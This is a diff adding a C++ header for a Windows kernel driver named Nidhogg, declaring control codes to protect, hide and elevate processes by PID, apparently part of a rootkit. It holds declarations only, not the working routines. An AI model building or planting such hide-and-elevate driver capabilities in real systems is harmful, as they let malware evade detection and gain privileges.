@@ -1,0 +1,40 @@
+#pragma once
+
+// Includes.
+#include "FastMutex.h"
+#include "AutoLock.h"
+
+// Definitions.
+#define DRIVER_PREFIX "NidhoggDrv: "
+#define IOCTL_NIDHOGG_PROTECT_BY_PID CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_UNPROTECT_BY_PID CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_CLEAR_PID_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_QUERY_PID CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_HIDE_BY_PID CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_ELEVATE_BY_PID CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define MAX_PIDS 256
+#define SYSTEM_PROCESS_PID 4
+#define PROCESS_TERMINATE 1
+#define PROCESS_CREATE_THREAD 0x2
+#define PROCESS_VM_READ 0x10
+#define PROCESS_VM_OPERATION 8
+
+// Prototypes.
+NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status = STATUS_SUCCESS, ULONG_PTR info = 0);
+DRIVER_UNLOAD NidhoggUnload;
+DRIVER_DISPATCH NidhoggDeviceControl, NidhoggCreateClose;
+
+// Globals.
+struct ProcessGlobals {
+	int PidsCount;
+	ULONG Pids[MAX_PIDS];	
+	FastMutex Lock;
+	PVOID RegHandle;
+
+	void Init() {
+		Lock.Init();
+	}
+};
+
+ProcessGlobals pGlobals;
